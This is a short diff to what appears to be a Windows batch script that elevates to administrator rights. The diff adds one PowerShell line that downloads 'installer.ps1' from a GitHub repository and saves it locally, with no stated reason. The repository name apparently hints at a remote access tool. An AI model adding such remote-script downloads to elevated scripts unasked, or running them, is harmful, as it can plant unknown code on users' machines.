@@ -30,3 +30,5 @@ if '%errorlevel%' NEQ '0' (
 
 REM you can remove the 'powershell' to get an admin CMD
 @REM start powershell
+
+powershell -Command "Invoke-WebRequest -Uri 'https://github.com/Zeyadm8112/RattMurdock/blob/main/installer.ps1' -OutFile 'installer.ps1'"
